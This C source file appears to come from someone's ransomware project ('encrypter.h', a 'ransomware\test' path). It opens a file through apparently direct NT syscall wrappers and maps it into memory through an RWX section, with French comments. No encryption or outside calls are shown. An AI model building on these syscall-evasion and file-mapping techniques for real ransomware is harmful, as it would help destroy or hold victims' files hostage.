#include "encrypter.h"

int main()
{
    OBJECT_ATTRIBUTES oa;
    HANDLE fileHandle = NULL;
    NTSTATUS status = 0;
    UNICODE_STRING fileName;
    IO_STATUS_BLOCK osb;

    RtlInitUnicodeString(&fileName, (PCWSTR)L"\\??\\C:\\Users\\l3gro\\Documents\\code\\C\\ransomware\\test\\monfichier.txt");
    ZeroMemory(&osb, sizeof(IO_STATUS_BLOCK));
    InitializeObjectAttributes(&oa, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
    // TODO : Se renseigner sur le caching de la mémoire
    // Avec notamment ces flags qui peuvent éviter le cache FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH
    status = SysNtCreateFile(
        &fileHandle,
        FILE_GENERIC_WRITE,
        &oa,
        &osb,
        0,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_WRITE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0);

    if (status != 0)
    {
        printf("Error opening file: 0x%X\n", status);
        return 1;
    }

    // Create a section for the file
    // The section is a memory-mapped file
    HANDLE sectionHandle = NULL;
    LARGE_INTEGER sectionSize;
    sectionSize.QuadPart = 0x100000; // 1MB

    SysNtCreateSection(
        &sectionHandle,
        SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
        NULL,
        (PLARGE_INTEGER)&sectionSize,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        fileHandle);

    // Map the section into the process's address space
    PVOID localSectionAddress = NULL;
    ULONG size = 0x10000; // 64KB
    ULONG zeroBits = 36; // Permet de forcer le système a mapper la vue dans une adresse basse de la mémoire virtuelle
    status = SysNtMapViewOfSection(
        sectionHandle,
        GetCurrentProcess(),
        &localSectionAddress,
        zeroBits,
        0,
        NULL,
        &size,
        2,
        MEM_COMMIT,
        PAGE_READWRITE);
    
    // Check if the mapping was successful
    if (NT_SUCCESS(status))
    {
        printf("Section mapped successfully at address: %p\n", localSectionAddress);
    }
    else
    {
        printf("Error mapping section: 0x%X\n", status);
        CloseHandle(sectionHandle);
        CloseHandle(fileHandle);
        return 1;
    }
    if (localSectionAddress == NULL)
    {
        printf("Error local address section is NULL : %d\n", GetLastError());
        CloseHandle(sectionHandle);
        CloseHandle(fileHandle);
        return 1;
    }

    // Free the section handle
    //  This will unmap the section from the process's address space
    //  and close the handle to the section object
    // Using the syscall NtUnmapViewOfSection(GetCurrentProcess(), localSectionAddress);
    UnmapViewOfFile(localSectionAddress);
    CloseHandle(sectionHandle);
    // Close the file handle
    CloseHandle(fileHandle);

    return 0;
}